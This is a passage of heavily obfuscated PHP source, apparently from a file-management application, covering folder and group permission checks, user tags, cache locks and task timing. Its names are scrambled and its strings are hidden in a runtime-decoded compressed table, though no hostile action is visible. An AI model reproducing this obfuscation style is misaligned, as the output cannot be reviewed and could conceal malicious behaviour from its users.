Model($ñĞâ¢¤[575])->authCheckAction($‘ÇÎ×Í¡[$ñĞâ¢¤[489]], $ñĞâ¢¤[2027])) { return $this->groupAuthInfo($‘ÇÎ×Í¡, $Èò³‡²÷); } $¦şÏ„£İ = Model($ñĞâ¢¤[1452])->parentLevelArray($‚Õ‰ÛØõ[$ñĞâ¢¤[588]]); $¦şÏ„£İ = array_merge(array($‚Õ‰ÛØõ[$ñĞâ¢¤[194]]), array_reverse($¦şÏ„£İ)); $ú×¯Ä§¾ = !1; foreach ($¦şÏ„£İ as $‘Û©Ç) { if (!isset($«çê¨À[$‘Û©Ç])) { continue; } $üõ§Ş = $this->authMake($«çê¨À[$‘Û©Ç], $ı÷«‹µû); if ($üõ§Ş[$ñĞâ¢¤[544]]) { $ú×¯Ä§¾ = $üõ§Ş; break; } } if (!$œ£”Óë—) { return $ú×¯Ä§¾; } if (!$ú×¯Ä§¾ && $‘ÇÎ×Í¡) { $ú×¯Ä§¾ = $this->groupAuthInfo($‘ÇÎ×Í¡, $Èò³‡²÷); } if (!$ú×¯Ä§¾) { $Üï‚ñ®Ø = Model($ñĞâ¢¤[589])->getInfo($Èò³‡²÷); $ÃÈÑŞ× = explode($ñĞâ¢¤[50], trim($Üï‚ñ®Ø[$ñĞâ¢¤[588]], $ñĞâ¢¤[50])); $ÃÈÑŞ× = array_reverse($ÃÈÑŞ×); foreach ($ÃÈÑŞ× as $«ëÔ¼æ) { if ($«ëÔ¼æ == $ñĞâ¢¤[231] || $«ëÔ¼æ == $ğ¸œ“…á) { continue; } $é€Å‰× = $this->groupRootAuth($«ëÔ¼æ, $ı÷«‹µû); if (!$é€Å‰×) { continue; } $ú×¯Ä§¾ = $this->groupAuthInfo($é€Å‰×, $«ëÔ¼æ); break; } } if (!$ú×¯Ä§¾ || $ú×¯Ä§¾[$ñĞâ¢¤[490]] <= 0) { $øÉšæíŠ = $this->authDeepCheck($‚Õ‰ÛØõ[$ñĞâ¢¤[194]], $ı÷«‹µû); if ($øÉšæíŠ) { $ú×¯Ä§¾ = $øÉšæíŠ; } } return $ú×¯Ä§¾; } private function userIsRoot($¹¶Äù¡Î = false) { $ÈåÌıÒ¢ =& $_SERVER[¯‘·½]; if (!$¹¶Äù¡Î && KodUser::isRoot()) { return !0; } $İ½ï• = Model($ÈåÌıÒ¢[601])->getInfo($¹¶Äù¡Î); $±ËÀ¼Ğ– = Model($ÈåÌıÒ¢[2216])->listData($İ½ï•[$ÈåÌıÒ¢[2217]]); if ($±ËÀ¼Ğ– && $±ËÀ¼Ğ–[$ÈåÌıÒ¢[579]][$ÈåÌıÒ¢[2218]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ÙŞ³Úı²) { $Ôä¡˜³ä =& $_SERVER[¯‘·½]; $Ê»Ù­¼Ô = Model($Ôä¡˜³ä[1452]); $µ…éÀº£ = $Ê»Ù­¼Ô->sourceInfo($ÙŞ³Úı²); if (!$µ…éÀº£) { return !1; } $Ê»Ù­¼Ô->groupPathDisplay($µ…éÀº£); $¨¯ØÒ˜ = array($µ…éÀº£); $¨¯ØÒ˜ = $Ê»Ù­¼Ô->_listAppendPath($¨¯ØÒ˜); $µ…éÀº£ = $¨¯ØÒ˜[0]; $»ÂÇÃ = $µ…éÀº£[$Ôä¡˜³ä[586]]; if (isset($µ…éÀº£[$Ôä¡˜³ä[594]])) { $÷™”…¥À = explode($Ôä¡˜³ä[8], trim($µ…éÀº£[$Ôä¡˜³ä[586]], $Ôä¡˜³ä[8])); array_shift($÷™”…¥À); $»ÂÇÃ = $µ…éÀº£[$Ôä¡˜³ä[592]] . $Ôä¡˜³ä[2219] . implode($Ôä¡˜³ä[8], $÷™”…¥À); } return array($Ôä¡˜³ä[496] => $µ…éÀº£[$Ôä¡˜³ä[32]], $Ôä¡˜³ä[87] => KodIO::make($µ…éÀº£[$Ôä¡˜³ä[194]]), $Ôä¡˜³ä[2220] => $»ÂÇÃ); } private function groupAuthInfo($±Òªà÷ò, $ÇµñşÚÛ) { $æ’Ñë§º =& $_SERVER[¯‘·½]; $ú¡ê¯µ· = Model($æ’Ñë§º[589])->getInfo($ÇµñşÚÛ); return array($æ’Ñë§º[2221] => intval($±Òªà÷ò[$æ’Ñë§º[489]]), $æ’Ñë§º[2204] => $±Òªà÷ò, $æ’Ñë§º[2222] => LNG($æ’Ñë§º[2223]), $æ’Ñë§º[2213] => array($æ’Ñë§º[496] => $ú¡ê¯µ·[$æ’Ñë§º[32]], $æ’Ñë§º[87] => KodIO::make($ú¡ê¯µ·[$æ’Ñë§º[90]][$æ’Ñë§º[194]]), $æ’Ñë§º[2220] => $ú¡ê¯µ·[$æ’Ñë§º[593]])); } protected function groupRootAuth($ìÚ¢ƒ, $Âêİ»Ñ× = false) { $¹šÏ÷íİ =& $_SERVER[¯‘·½]; $Âêİ»Ñ× = $Âêİ»Ñ× ? $Âêİ»Ñ× : USER_ID; $¦î¥…ˆó = $Âêİ»Ñ× . $¹šÏ÷íİ[2224] . $ìÚ¢ƒ; static $§ñÍ´Üã = array(); if (isset($§ñÍ´Üã[$¦î¥…ˆó])) { return $§ñÍ´Üã[$¦î¥…ˆó]; } $†™»§ñç = Model($¹šÏ÷íİ[589])->getInfo($ìÚ¢ƒ); $Æ’­•´ = $this->userGroupList($Âêİ»Ñ×); $áùà£Õå = isset($Æ’­•´[$ìÚ¢ƒ]) ? $Æ’­•´[$ìÚ¢ƒ][$¹šÏ÷íİ[489]] : !1; if ($áùà£Õå && Model($¹šÏ÷íİ[575])->authCheckAction($áùà£Õå[$¹šÏ÷íİ[489]], $¹šÏ÷íİ[2027])) { $§ñÍ´Üã[$¦î¥…ˆó] = $áùà£Õå; return $áùà£Õå; } $‘Ù‰¤‡œ = $this->sourceAuthSelect($†™»§ñç[$¹šÏ÷íİ[90]][$¹šÏ÷íİ[194]]); $úü÷°™ñ = $‘Ù‰¤‡œ ? $this->authMake($‘Ù‰¤‡œ, $Âêİ»Ñ×) : !1; $°¥é·‚— = $úü÷°™ñ ? $úü÷°™ñ[$¹šÏ÷íİ[544]] : !1; $§ñÍ´Üã[$¦î¥…ˆó] = $°¥é·‚— ? $°¥é·‚— : $áùà£Õå; return $§ñÍ´Üã[$¦î¥…ˆó]; } public function authOwnerApply($«ÃüçÏ) { $Ü²¡üØã =& $_SERVER[¯‘·½]; if (empty($«ÃüçÏ[$Ü²¡üØã[489]]) || isset($«ÃüçÏ[$Ü²¡üØã[2225]]) && $«ÃüçÏ[$Ü²¡üØã[2225]]) { return $«ÃüçÏ; } if (AuthModel::authCheckRoot($«ÃüçÏ[$Ü²¡üØã[489]][$Ü²¡üØã[490]])) { return $«ÃüçÏ; } $­¬—¼€‹ = Model($Ü²¡üØã[1452])->parentLevelArray($«ÃüçÏ[$Ü²¡üØã[588]]); $­¬—¼€‹ = array_merge(array($«ÃüçÏ[$Ü²¡üØã[194]]), array_reverse($­¬—¼€‹)); $ó¨ØŠıï = $this->sourceAuthSelect($­¬—¼€‹); $›ÌäöÏê = array(); $üÎ†§Åš = array(); foreach ($ó¨ØŠıï as $„ãÆ°§ => $ÀˆıäšŒ) { $ÚÓ’š…” = $this->authFolderOwnerUser($ÀˆıäšŒ); $›ÌäöÏê[$„ãÆ°§] = $ÚÓ’š…”; $üÎ†§Åš = array_merge($üÎ†§Åš, $ÚÓ’š…”[$Ü²¡üØã[669]]); if ($ÚÓ’š…”[$Ü²¡üØã[2226]]) { break; } } if (count($üÎ†§Åš) == 0) { $üÎ†§Åš = $this->authFolderOwnerGroup($«ÃüçÏ[$Ü²¡üØã[573]]); } $üÎ†§Åš = array_unique($üÎ†§Åš); if (AuthModel::authCheckRoot($«ÃüçÏ[$Ü²¡üØã[489]][$Ü²¡üØã[490]])) { $üÎ†§Åš[] = USER_ID; } $«ÃüçÏ[$Ü²¡üØã[489]][$Ü²¡üØã[2227]] = Model($Ü²¡üØã[581])->userListInfo($üÎ†§Åš); return $«ÃüçÏ; } private function authFolderOwnerGroup($âŠ —§Ô) { $óê•†¬é =& $_SERVER[¯‘·½]; $©Ş«»œ‚ = Model($óê•†¬é[2101])->where(array($óê•†¬é[1414] => $âŠ —§Ô))->select(); $Ãß Ú›Š = array(); if (!$©Ş«»œ‚) { return $Ãß Ú›Š; } foreach ($©Ş«»œ‚ as $¢Î¾¢) { $ŒèãÛ¯¡ = $this->authInfo($¢Î¾¢); if (AuthModel::authCheckRoot($ŒèãÛ¯¡[$óê•†¬é[489]])) { $Ãß Ú›Š[] = $¢Î¾¢[$óê•†¬é[1806]]; } } return $Ãß Ú›Š; } private function authFolderOwnerUser($ö™ˆ„®Å) { $£³½’Û =& $_SERVER[¯‘·½]; $Ö”ÉÉŠá = array(); $âã³Ó£Æ = !1; foreach ($ö™ˆ„®Å as $Ú”æİ¥) { $ıª¬â´ = $this->authInfo($Ú”æİ¥); if ($Ú”æİ¥[$£³½’Û[573]] == $£³½’Û[231]) { $âã³Ó£Æ = !0; } if ($Ú”æİ¥[$£³½’Û[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ıª¬â´[$£³½’Û[489]])) { $Ö”ÉÉŠá[] = $Ú”æİ¥[$£³½’Û[573]]; } } } return array($£³½’Û[669] => $Ö”ÉÉŠá, $£³½’Û[2226] => $âã³Ó£Æ); } public function authMake($èÛˆõôç, $¥’—±¡è = false) { $ó“Çİòñ =& $_SERVER[¯‘·½]; $‡ùãîæŞ = $this->authArrayCheck($èÛˆõôç, $¥’—±¡è); if ($‡ùãîæŞ[$ó“Çİòñ[2228]]) { $‡ùãîæŞ[$ó“Çİòñ[2228]] = $this->sourceAuthInfo($‡ùãîæŞ[$ó“Çİòñ[2228]]); } return $‡ùãîæŞ; } public function authArrayCheck($çá×Şîº, $áå…ºÒ = false) { $ôËƒçÉ =& $_SERVER[¯‘·½]; if (!$çá×Şîº) { return array($ôËƒçÉ[490] => 0, $ôËƒçÉ[544] => !1); } $áå…ºÒ = $áå…ºÒ ? $áå…ºÒ : USER_ID; $®…Õñé = 0; $İ¶åìí· = 0; $çöÑ§ = 0; $ÀÂ°Å¹ = 0; $ÂÌÊÖ×ı = 0; $ùÒ¤ğ£Æ = 0; $Ş†Ü”ÆË = 1000; $Ó†ÒÚ¸ = 0; $‰±İü£ = 0; $ø‡˜ùÏœ = 0; $ÌŠùÁ×£ = 0; $çÕÊ¥òÉ = array($ôËƒçÉ[194] => 0); foreach ($çá×Şîº as $çÕÊ¥òÉ) { $¤„˜¬£Ñ = $this->authInfo($çÕÊ¥òÉ); if (!$¤„˜¬£Ñ) { continue; } $œıä™â = $çÕÊ¥òÉ[$ôËƒçÉ[573]]; $Í°Ù„é¾ = intval($¤„˜¬£Ñ[$ôËƒçÉ[489]]); if ($çÕÊ¥òÉ[$ôËƒçÉ[191]] == SourceModel::TYPE_USER && $œıä™â == $áå…ºÒ) { $®…Õñé = !0; $çöÑ§ = $¤„˜¬£Ñ; $İ¶åìí· = $Í°Ù„é¾; } else { if ($çÕÊ¥òÉ[$ôËƒçÉ[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($œıä™â, $áå…ºÒ)) { $ÀÂ°Å¹ = !0; $úéÎ«Ñ = $this->groupStepToUserGroup($œıä™â, $áå…ºÒ); if ($úéÎ«Ñ < $Ş†Ü”ÆË) { $Ş†Ü”ÆË = $úéÎ«Ñ; $ÂÌÊÖ×ı = $Í°Ù„é¾; $ùÒ¤ğ£Æ = $¤„˜¬£Ñ; $Ó†ÒÚ¸ = $œıä™â; } if ($úéÎ«Ñ == $Ş†Ü”ÆË && $Í°Ù„é¾ >= $ÂÌÊÖ×ı) { $ÂÌÊÖ×ı = $Í°Ù„é¾; $ùÒ¤ğ£Æ = $¤„˜¬£Ñ; $Ó†ÒÚ¸ = $œıä™â; } } else { if ($œıä™â == $ôËƒçÉ[231]) { $‰±İü£ = !0; $ÌŠùÁ×£ = $¤„˜¬£Ñ; $ø‡˜ùÏœ = $Í°Ù„é¾; } } } } if ($®…Õñé) { $Î€¯ÄÀÒ = $İ¶åìí·; $¤„˜¬£Ñ = $çöÑ§; $ãó¯Ö¬í = LNG($ôËƒçÉ[2229]); } else { if ($ÀÂ°Å¹) { $Î€¯ÄÀÒ = $ÂÌÊÖ×ı; $¤„˜¬£Ñ = $ùÒ¤ğ£Æ; $–ä¤Å° = Model($ôËƒçÉ[589])->getInfo($Ó†ÒÚ¸); $ãó¯Ö¬í = $ôËƒçÉ[176] . $–ä¤Å°[$ôËƒçÉ[593]] . $ôËƒçÉ[2230] . LNG($ôËƒçÉ[2231]); } else { if ($‰±İü£) { $Î€¯ÄÀÒ = $ø‡˜ùÏœ; $¤„˜¬£Ñ = $ÌŠùÁ×£; $ãó¯Ö¬í = LNG($ôËƒçÉ[2202]); } else { $Î€¯ÄÀÒ = 0; $¤„˜¬£Ñ = !1; $ãó¯Ö¬í = $ôËƒçÉ[12]; } } } $Îß“ÙÜÈ = array($ôËƒçÉ[2221] => intval($Î€¯ÄÀÒ), $ôËƒçÉ[2204] => $¤„˜¬£Ñ, $ôËƒçÉ[2222] => $ãó¯Ö¬í, $ôËƒçÉ[2213] => $çÕÊ¥òÉ[$ôËƒçÉ[194]]); return $Îß“ÙÜÈ; } private function groupContainUser($ÈÄÉ«´™, $ÛÖÂ‚ôŒ = false) { return in_array($ÈÄÉ«´™, $this->userGroupParents($ÛÖÂ‚ôŒ)); } private function groupStepToUserGroup($Ü–Ò´¬, $Ú¹¬Æ = false) { $øÔ¡âİº =& $_SERVER[¯‘·½]; $ùÊäÂÄÛ = $this->userGroupList($Ú¹¬Æ); $–—á»åó = 1000; $š–ó÷ìÄ = $GLOBALS[$øÔ¡âİº[6]][$øÔ¡âİº[92]][$øÔ¡âİº[2114]] == 1; $é‚àÁ¹ä = $š–ó÷ìÄ ? 3 : 2; foreach ($ùÊäÂÄÛ as $ó±İî’ı) { if ($ó±İî’ı[$øÔ¡âİº[1414]] == $Ü–Ò´¬) { return 0; } $¬€Û©­› = explode($øÔ¡âİº[50], trim($ó±İî’ı[$øÔ¡âİº[588]], $øÔ¡âİº[50])); if ($¬€Û©­›[0] == $øÔ¡âİº[231] && count($¬€Û©­›) > $é‚àÁ¹ä) { $ššÅ—éŒ = array_reverse(array_slice($¬€Û©­›, $é‚àÁ¹ä)); $ûœ‰Ë¿ƒ = array_search($Ü–Ò´¬, $ššÅ—éŒ); if ($ûœ‰Ë¿ƒ !== !1 && $ûœ‰Ë¿ƒ + 1 <= $–—á»åó) { $–—á»åó = $ûœ‰Ë¿ƒ + 1; } } } return $–—á»åó; } private function userGroupList($˜ıÌ÷‹ë = false) { $šœ‘¢éØ =& $_SERVER[¯‘·½]; static $ØªĞŸŞÔ = array(); if (isset($ØªĞŸŞÔ[$˜ıÌ÷‹ë])) { return $ØªĞŸŞÔ[$˜ıÌ÷‹ë]; } $—¯ÚÌÅ = Model($šœ‘¢éØ[601])->getInfo($˜ıÌ÷‹ë); $ØªĞŸŞÔ[$˜ıÌ÷‹ë] = array_to_keyvalue($—¯ÚÌÅ[$šœ‘¢éØ[1413]], $šœ‘¢éØ[1414]); return $ØªĞŸŞÔ[$˜ıÌ÷‹ë]; } public function userGroupParents($ ±ê÷É) { $¢ÑÔÒ²¢ =& $_SERVER[¯‘·½]; static $°¾Æ¥Ù = array(); $ ±ê÷É = $ ±ê÷É ? $ ±ê÷É : USER_ID; if (isset($°¾Æ¥Ù[$ ±ê÷É])) { return $°¾Æ¥Ù[$ ±ê÷É]; } $­ˆÆ€í… = $this->userGroupList($ ±ê÷É); $£¨øƒÌ­ = array(); $²ŒçÀ“™ = $GLOBALS[$¢ÑÔÒ²¢[6]][$¢ÑÔÒ²¢[92]][$¢ÑÔÒ²¢[2114]] == 1; $Ä¼ÛÒÈÌ = $²ŒçÀ“™ ? 3 : 2; foreach ($­ˆÆ€í… as $İË­– ô) { $¦í³´® = array($İË­– ô[$¢ÑÔÒ²¢[1414]]); $•…Ê‰¯º = explode($¢ÑÔÒ²¢[50], trim($İË­– ô[$¢ÑÔÒ²¢[588]], $¢ÑÔÒ²¢[50])); if ($•…Ê‰¯º[0] == $¢ÑÔÒ²¢[231] && count($•…Ê‰¯º) > $Ä¼ÛÒÈÌ) { $¶ÖõÂó§ = array_slice($•…Ê‰¯º, $Ä¼ÛÒÈÌ); $¦í³´® = array_merge($¦í³´®, array_reverse($¶ÖõÂó§)); } $£¨øƒÌ­ = array_merge($£¨øƒÌ­, $¦í³´®); } $°¾Æ¥Ù[$ ±ê÷É] = array_unique($£¨øƒÌ­); return $°¾Æ¥Ù[$ ±ê÷É]; } public function authTargetInfoMake($…—Í†) { $·‹Ä¹Ğë =& $_SERVER[¯‘·½]; $¼Ü´‹Ø = array(); $ÁŠäÖ¤¡ = array(); foreach ($…—Í† as $¸ Íı¬µ) { if ($¸ Íı¬µ[$·‹Ä¹Ğë[191]] == SourceModel::TYPE_USER) { $¼Ü´‹Ø[] = intval($¸ Íı¬µ[$·‹Ä¹Ğë[573]]); } else { if ($¸ Íı¬µ[$·‹Ä¹Ğë[191]] == SourceModel::TYPE_GROUP) { $ÁŠäÖ¤¡[] = intval($¸ Íı¬µ[$·‹Ä¹Ğë[573]]); } } } if ($¼Ü´‹Ø) { $¼Ü´‹Ø = Model($·‹Ä¹Ğë[581])->userListInfo($¼Ü´‹Ø); } if ($ÁŠäÖ¤¡) { $ëŒÛÛ• = array($·‹Ä¹Ğë[2096] => array($·‹Ä¹Ğë[494], $ÁŠäÖ¤¡)); $ÁŠäÖ¤¡ = Model($·‹Ä¹Ğë[589])->field($·‹Ä¹Ğë[2232])->where($ëŒÛÛ•)->select(); $ÁŠäÖ¤¡ = array_to_keyvalue($ÁŠäÖ¤¡, $·‹Ä¹Ğë[1414]); } return array($·‹Ä¹Ğë[2233] => $¼Ü´‹Ø, $·‹Ä¹Ğë[2234] => $ÁŠäÖ¤¡); } public function authInfo($¶¸¯—ä©) { $–Ù–Äì‡ =& $_SERVER[¯‘·½]; if ($¶¸¯—ä©[$–Ù–Äì‡[2115]]) { $ıã²¦íÕ = Model($–Ù–Äì‡[575])->listData($¶¸¯—ä©[$–Ù–Äì‡[2115]]); if (!$ıã²¦íÕ) { return !1; $ê¯Ş÷‡ = Model($–Ù–Äì‡[575])->listData(); $Ï–áŸí¢ = array_filter_by_field($ê¯Ş÷‡, $–Ù–Äì‡[489], $–Ù–Äì‡[231]); return $Ï–áŸí¢; } $Âö­£¿ú = array_field_key($ıã²¦íÕ, array($–Ù–Äì‡[477], $–Ù–Äì‡[32], $–Ù–Äì‡[489], $–Ù–Äì‡[2029], $–Ù–Äì‡[2030])); $Âö­£¿ú[$–Ù–Äì‡[2235]] = $¶¸¯—ä©; return $Âö­£¿ú; } else { return array($–Ù–Äì‡[495] => 0, $–Ù–Äì‡[2012] => $¶¸¯—ä©[$–Ù–Äì‡[2178]], $–Ù–Äì‡[496] => $–Ù–Äì‡[12], $–Ù–Äì‡[2029] => $–Ù–Äì‡[2236]); } } } goto E‘°—Ç¯Œù; eñ­Ç©„Â¹: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\56\x74\141\147\114\151\163\x74"; public $modelType = "\125\163\x65\x72\x4f\160\x74\151\157\156"; public $field = array("\156\141\x6d\145", "\x73\164\x79\x6c\145", "\163\157\162\x74"); public function listData($¤¡Å¸¿ = false, $ŠêñÌ© = "\163\157\162\164", $ÈªşÆĞÇ = false) { return parent::listData($¤¡Å¸¿, $ŠêñÌ©, $ÈªşÆĞÇ); } public function remove($Ö»‹Éƒ) { return parent::remove($Ö»‹Éƒ); } public function add($¤Äôˆ†, $Œê›°†í = "\x6c\141\x62\x65\154\55\147\162\x65\x79\55\156\157\x72\155\x61\x6c") { $ÎºÌ±– =& $_SERVER[¯‘·½]; if ($this->findByName($¤Äôˆ†)) { return !1; } $à¹§úù = array($ÎºÌ±–[496] => $¤Äôˆ†, $ÎºÌ±–[562] => $Œê›°†í, $ÎºÌ±–[2010] => $this->getSort($ÎºÌ±–[338]) + 1); return parent::insert($à¹§úù); } public function update($éôÆ­é, $ÈŠ™­ãƒ) { $µÏ…µˆ· =& $_SERVER[¯‘·½]; $êã¦Ùà = $this->listData($éôÆ­é); $ÓõçÅ» = $this->findByName($ÈŠ™­ãƒ[$µÏ…µˆ·[32]]); if (!$êã¦Ùà || $ÓõçÅ» && $ÓõçÅ»[$µÏ…µˆ·[477]] != $êã¦Ùà[$µÏ…µˆ·[477]]) { return !1; } return parent::update($éôÆ­é, $ÈŠ™­ãƒ); } public function moveTop($ÕÄÍá±) { $£òÇÊòÂ =& $_SERVER[¯‘·½]; $ ë¸†š® = parent::listData(); $À¤ãØğ = $this->getSort($£òÇÊòÂ[337]); foreach ($ ë¸†š® as &$ŒıÃ§„ö) { if ($ŒıÃ§„ö[$£òÇÊòÂ[477]] == $ÕÄÍá±) { $ŒıÃ§„ö[$£òÇÊòÂ[2030]] = $À¤ãØğ; continue; } $ŒıÃ§„ö[$£òÇÊòÂ[2030]] += 1; } unset($ŒıÃ§„ö); return parent::resetData($ ë¸†š®); } public function moveBottom($ĞüÌ£¡) { $Ç¨«ÑÚÉ =& $_SERVER[¯‘·½]; $‰ÑÈŞê = $this->getSort($Ç¨«ÑÚÉ[338]) + 1; return parent::update($ĞüÌ£¡, array($Ç¨«ÑÚÉ[2030] => $‰ÑÈŞê)); } public function resetSort($æ¸òœß•) { $Ø¼ÊŞ =& $_SERVER[¯‘·½]; $×‰ÚÌ²Ù = array(); $æ¸òœß• = is_array($æ¸òœß•) ? $æ¸òœß• : array(); for ($ÆùÃà¤¸ = 0; $ÆùÃà¤¸ < count($æ¸òœß•); $ÆùÃà¤¸++) { $×‰ÚÌ²Ù[$æ¸òœß•[$ÆùÃà¤¸] . $Ø¼ÊŞ[12]] = $ÆùÃà¤¸ + 1; } $Ëø‡“ôó = parent::listData(); foreach ($Ëø‡“ôó as &$Ó—‚ö˜™) { $Üµ „¼À = $×‰ÚÌ²Ù[$Ó—‚ö˜™[$Ø¼ÊŞ[477]]]; $Ó—‚ö˜™[$Ø¼ÊŞ[2030]] = $Üµ „¼À ? $Üµ „¼À : $Ó—‚ö˜™[$Ø¼ÊŞ[2030]]; } unset($Ó—‚ö˜™); return parent::resetData($Ëø‡“ôó); } private function getSort($»ğï´ç¸) { $òÀÔ®éŞ =& $_SERVER[¯‘·½]; $ÀÚ˜µ¢˜ = parent::listData(); $†ªª®Œ = array_to_keyvalue($ÀÚ˜µ¢˜, $òÀÔ®éŞ[12], $òÀÔ®éŞ[2030]); if (!$†ªª®Œ) { $†ªª®Œ = array(0); } $†¬óÀô¸ = $»ğï´ç¸ == $òÀÔ®éŞ[338] ? max($†ªª®Œ) : min($†ªª®Œ); return intval($†¬óÀô¸); } } goto dˆƒ‰êïİ£; d®È÷–”è: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $óú†åÆÊ =& $_SERVER[¯‘·½]; $­ä¾Ù· = $GLOBALS[$óú†åÆÊ[6]][$óú†åÆÊ[426]]; self::$cachePath = $­ä¾Ù·[$óú†åÆÊ[233]][$óú†åÆÊ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($›„„øÕ, $ùÇöÜì® = 0) { $Œü±ü÷ =& $_SERVER[¯‘·½]; $èëıË¤ = microtime(!0); $°öõïşû = $èëıË¤ + $ùÇöÜì® + 0.0001; $‘´˜‚ˆ¡ = rtrim(self::$cachePath, $Œü±ü÷[8]) . $Œü±ü÷[956] . md5($›„„øÕ) . $Œü±ü÷[953]; if (file_exists($‘´˜‚ˆ¡) && filemtime($‘´˜‚ˆ¡) && filemtime($‘´˜‚ˆ¡) < time() - 10) { @unlink($‘´˜‚ˆ¡); } do { if (file_exists($‘´˜‚ˆ¡)) { cacheLockWait(); continue; } $ğ…ä‰ÕŒ = fopen($‘´˜‚ˆ¡, $Œü±ü÷[957]); if (!$ğ…ä‰ÕŒ) { return !1; } $ØÒ‰£á¥ = flock($ğ…ä‰ÕŒ, LOCK_EX | LOCK_NB); self::$caches[$›„„øÕ] = array($Œü±ü÷[958] => $ğ…ä‰ÕŒ, $Œü±ü÷[233] => $‘´˜‚ˆ¡); fwrite($ğ…ä‰ÕŒ, $°öõïşû); clearstatcache(); if ($ğ…ä‰ÕŒ && $ØÒ‰£á¥) { return !0; } cacheLockWait(); } while (microtime(!0) < $°öõïşû); $this->unlock($›„„øÕ); return !1; } public function lockGet($´ë²ö¥­) { $¥ñŸ·Ø =& $_SERVER[¯‘·½]; $•Œ™“¦‰ = rtrim(self::$cachePath, $¥ñŸ·Ø[8]) . $¥ñŸ·Ø[956] . md5($´ë²ö¥­) . $¥ñŸ·Ø[953]; return file_exists($•Œ™“¦‰); } public function unlock($ÎÅ¾“„™) { $úèïË ú =& $_SERVER[¯‘·½]; $§Éß’®ø = self::$caches[$ÎÅ¾“„™]; if (!$§Éß’®ø) { return; } @flock($§Éß’®ø[$úèïË ú[958]], LOCK_UN); @fclose($§Éß’®ø[$úèïË ú[958]]); @unlink($§Éß’®ø[$úèïË ú[233]]); unset(self::$caches[$ÎÅ¾“„™]); } } class CacheLockRedis { public function lock($¦öÁ‹ô, $ó—ªûç£ = 10) { $ŸÂŸÂŞñ = Cache::init(); $™üÊÛõ = microtime(!0) + $ó—ªûç£; while (microtime(!0) < $™üÊÛõ) { $÷¨£ÎÖ” = $ŸÂŸÂŞñ->get($¦öÁ‹ô); if (!$÷¨£ÎÖ”) { $á÷‘À‡­ = $ŸÂŸÂŞñ->setLock($¦öÁ‹ô, $™üÊÛõ, $ó—ªûç£); if ($á÷‘À‡­) { return !0; } } else { if ($÷¨£ÎÖ” < microtime(!0)) { $ŸÂŸÂŞñ->set($¦öÁ‹ô, $™üÊÛõ, $ó—ªûç£ * 2); if ($ŸÂŸÂŞñ->get($¦öÁ‹ô) === $÷¨£ÎÖ”) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ïí¼¿«Â) { return Cache::init()->get($Ïí¼¿«Â); } public function unlock($‡òú¬–¿) { return Cache::init()->remove($‡òú¬–¿); } } class CacheLockMemcached { public function lock($“¬Îøõú, $¹©¿›‰¬ = 0) { $è¤Ü×ã = Cache::init(); $»„É“Òë = microtime(!0) + $¹©¿›‰¬; while (microtime(!0) < $»„É“Òë) { $­ıŠÛŸ = $è¤Ü×ã->get($“¬Îøõú); if (!$­ıŠÛŸ || $­ıŠÛŸ < microtime(!0)) { $­•ªÊ = $è¤Ü×ã->handle->add($“¬Îøõú, $»„É“Òë, $¹©¿›‰¬); if ($­•ªÊ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($´İÒŞØ•) { return Cache::init()->get($´İÒŞØ•); } public function unlock($ç°˜Ô‰) { return Cache::init()->remove($ç°˜Ô‰); } } goto F…× µñÃå; eçÀºŠÎ¸: define($_SERVER[¯‘·½][0], $_SERVER[¯‘·½][1]); $_SERVER[„ãïšğŞ] = explode($_SERVER[¯‘·½][2], gzinflate(substr($_SERVER[¯‘·½][3], 10, -8))); function binCheckEq($ÑÁêêÔ, $Õ¥¡ãÚº) { return $ÑÁêêÔ == $Õ¥¡ãÚº; } goto a™ßªŠ¡ãï; c·¼„óß: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($‹…§âÕƒ, $úÚè§Û¶ = 5.0) { if (!$‹…§âÕƒ) { return; } $ó¿ÀÒñæ = Cache::get($‹…§âÕƒ); if (!$ó¿ÀÒñæ || timeFloat() - floatVal($ó¿ÀÒñæ) >= $úÚè§Û¶) { Cache::set($‹…§âÕƒ, timeFloat(), $úÚè§Û¶ * 10); return !0; } return !1; } public static function timeLimitCall($›ÏŸ”°, $••ó¨, $ôçÓ†Ç, $Ä™ßû¯ô = 5.0) { $½íñ¡¥Â =& $_SERVER[¯‘·½]; if (!$›ÏŸ”° || !$••ó¨) { return; } self::$asyncAdd = !0; $çÀ«€İ = $½íñ¡¥Â[1914]; $¾šéÔÌ = Cache::get($çÀ«€İ, !0); $ÅŠÍĞ‡ù = array($½íñ¡¥Â[1915] => timeFloat(), $½íñ¡¥Â[1916] => timeFloat(), $½íñ¡¥Â[344] => $••ó¨, $½íñ¡¥Â[1906] => $ôçÓ†Ç, $½íñ¡¥Â[1917] => $Ä™ßû¯ô); if (is_array($¾šéÔÌ[$›ÏŸ”°])) { if (timeFloat() - $¾šéÔÌ[$›ÏŸ”°][$½íñ¡¥Â[1915]] <= $ÅŠÍĞ‡ù[$½íñ¡¥Â[1917]] * 0.5) { return; } $ÅŠÍĞ‡ù[$½íñ¡¥Â[1916]] = $¾šéÔÌ[$›ÏŸ”°][$½íñ¡¥Â[1916]]; } $¾šéÔÌ[$›ÏŸ”°] = $ÅŠÍĞ‡ù; Cache::set($çÀ«€İ, $¾šéÔÌ, 60); Cache::removeMemory($çÀ«€İ); write_log($½íñ¡¥Â[1918] . $›ÏŸ”° . $½íñ¡¥Â[74] . $••ó¨ . $½íñ¡¥Â[1919] . ACTION, $½íñ¡¥Â[198]); } public static function timeLimitCallLoop() { $ç÷‘í­˜ =& $_SERVER[¯‘·½]; $çïŒ«Ò‰ = array($ç÷‘í­˜[1920]); $´€¹êˆÈ = in_array(strtolower(ACTION), $çïŒ«Ò‰); if (!$´€¹êˆÈ && !self::$asyncAdd) { return; } $¾îÔ§Ë® = $ç÷‘í­˜[1914]; $±¼±ë…á = Cache::get($¾îÔ§Ë®, !0); if (!$±¼±ë…á || count($±¼±ë…á) <= 0) { return; } $ıúÊšüÜ = timeFloat(); $¸¥é¼Ú­ = array(); $ËÉáš›Î = array(); foreach ($±¼±ë…á as $‚ä‘€×¦ => $°’‘©¿) { if ($ıúÊšüÜ - 